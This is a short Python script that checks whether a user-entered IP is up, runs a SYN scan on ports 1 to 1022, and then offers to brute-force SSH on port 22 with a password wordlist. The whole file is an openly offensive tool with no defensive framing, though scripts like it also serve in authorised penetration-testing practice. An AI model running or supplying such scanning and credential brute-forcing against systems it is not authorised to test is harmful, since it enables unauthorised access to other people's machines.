from scapy.layers.inet import *
import paramiko

target = input("Enter target IP: ")
ports = range(1, 1023)
open_ports = []


def scan_port(port):
    src_port = RandShort()
    conf.verb = 0
    syn_pkt = sr1(IP(dst=target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5, verbose=False)  # SYN request
    try:
        if syn_pkt.haslayer(TCP):
            if syn_pkt.getlayer(TCP).flags == 0x12:  # equal to SYN-ACK response
                sr(IP(dst=target) / TCP(sport=src_port, dport=port, flags="R"), timeout=2)  # RST request
                return True
        else:
            print(False)
    except Exception as err:
        print(err)


def check_availability(target):
    try:
        conf.verb = 0
        ping = sr1(IP(dst=target)/ICMP(), retry=0, timeout=3)
    except Exception as err:
        print(err)
        return False

    if ping.haslayer(ICMP):
        return True


def brute_force(port):
    user = input("Enter SSH username: ")
    wordlist = input("Enter your pass file path: ")
    with open(wordlist, "r") as file:
        passwords = file.readlines()
        sshconn = paramiko.SSHClient()
        sshconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in passwords:
            try:
                sshconn.connect(target, port=int(port), username=user, password=password, timeout=1)
                if sshconn:
                    print(f"the password for {user} is {password}")
                    sshconn.close()
                    break
            except Exception:
                print(f"{str(password)} failed.")


if check_availability(target):
    for port in ports:
        status = scan_port(port)
        if status:
            open_ports.append(port)
            print(f"port {port} is open")
    print("Scan finished!\n")
    
    if 22 in open_ports:
        print("Port 22 exist.")
        action = input("Do you want to brute-force it? (yes / no): ")
        if action[0] == "y" or action[0] == "Y":
            brute_force(22)
        else:
            exit()

